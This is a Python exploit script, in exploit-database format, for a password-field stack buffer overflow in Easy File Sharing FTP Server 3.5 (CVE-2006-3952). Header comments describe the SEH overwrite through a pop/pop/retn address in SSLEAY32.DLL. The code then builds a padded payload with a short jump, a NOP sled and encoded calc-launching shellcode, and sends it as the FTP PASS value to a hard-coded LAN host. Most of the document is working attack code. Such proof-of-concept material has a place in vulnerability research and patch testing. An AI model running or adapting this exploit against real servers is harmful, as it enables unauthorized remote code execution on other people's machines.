#!/usr/bin/env python
# Exploit Title: Easy File Sharing FTP Server 3.5 stack buffer overflow
# Date: 27 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vulnerability discovered by: h07
# CVE: CVE-2006-3952
# OSVDB: 27646
# Vendor Homepage: http://www.efssoft.com
# Software Link: http://www.efssoft.com/ftpserver.htm
# Version: 3.5
# Tested on: Windows 8.1 Enterprise , English
#          : Windows 7 Enterprise SP1, English
#          : Windows XP SP3, English
#
# Description: 
# A buffer overflow is triggered when when a large password is sent to the 
# server.
#
# h07 found this bug in 2006, targetting EFS FTP Server 2.0. The original 
# exploits relied on OS DLLs to reference a pop/pop/retn address to leverage a 
# SEH attack. This was a bit unreliable as different versions of Windows would 
# have different addresses and the exploit would need to be modified with the 
# correct pop/pop/retn address. 
#
# Fast forward to 2014. EFS FTP Server is now at version 3.5 (2012) and 
# includes new features, such as SSL support. Ironically, by adding SSL 
# support, they've given us a reliable pop/pop/retn address in the included 
# SSLEAY32.DLL! This exploit should work reliably with any Windows release. 


import socket
import struct

# calc shellcode from https://code.google.com/p/win-exec-calc-shellcode/
# msfencode -b "\x00\x20" -i w32-exec-calc-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 101 (iteration=1)
shellcode = ( 
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
"\x1c\x39\xbd"
)

payload = "\x2c"
payload += "A"*2559
payload += "\xeb\x19\x90\x90"               # jmp to nop sled + shellcode
payload += struct.pack("<I", 0x10017F21)    # pop/pop/ret, SSLEAY32.DLL
payload += "\x90"*30
payload += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.26", 21))
s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS " + payload + "\r\n")
s.recv(1024)
s.close()